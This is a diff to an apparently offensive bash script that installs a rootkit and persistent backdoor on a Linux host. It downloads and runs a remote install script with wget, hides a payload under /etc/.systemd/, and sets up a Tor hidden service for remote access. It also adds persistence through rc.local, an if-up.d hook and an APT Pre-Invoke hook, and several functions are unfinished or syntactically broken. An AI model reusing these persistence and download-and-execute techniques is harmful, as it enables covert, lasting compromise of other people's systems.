@@ -22,8 +22,8 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 HIDDEN_DIR="/etc/.systemd/"           # Directory for binaries
-PAY_NAME="Zero"#$1                    # Name of binary to installs (preferably .elf)
-PAYLOAD="${HIDDEN_DIR}${PAY_NAME}"    # Full path to payload
+PAYLOAD_NAME="Zero"#$                     # Name of binary to installs (preferably .elf)
+PAYLOAD="${HIDDEN_DIR}${PAYLOAD_NAME}"    # Full path to payload
 
 
 #**************************************************************************#
@@ -63,10 +63,12 @@ function unpack_kit {
 }
 
 
+
 function install_rootkit {
     wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh &&
     chmod +x /tmp/quick_install.sh && /tmp/quick_install.sh
 }
+
 
 
 function add_user {
@@ -103,6 +105,7 @@ function create_service {
 }
 
 
+
 # Not finished!
 function add_rclocal {
     if [ "bash /root/.systemd/Zero &" = "$(cat /etc/rc.local | grep [Z]ero)" ]; then
@@ -120,6 +123,31 @@ function hidden_service {
     systemctl restart tor.service && systemctl enable tor.service
     URL=$(cat /var/lib/tor/secret_service/hostname)
     echo "$URL is your new client address."
+}
+
+
+# Not finished!
+function backdoor_startup_service {
+    $PAYLOAD="$PAYLOAD 2>dev/null"
+    sed -i -e "4i\$PAYLOAD /etc/network/if-up.d/upstart"
+}
+
+
+# Not finished!
+function backdoor_apt_update {
+     echo 'APT::Update::Pre-Invoke {"nohup ${PAYLOAD} 2>/dev/null &"};' > /etc/apt/apt.conf.d/42systemd
+
+}
+
+
+function add_sshkey {
+    #KEY=$(wget -o key.pem...)
+    echo "LOL"
+}
+
+
+function add_bashrc{
+    echo "LOL"
 }
 
 
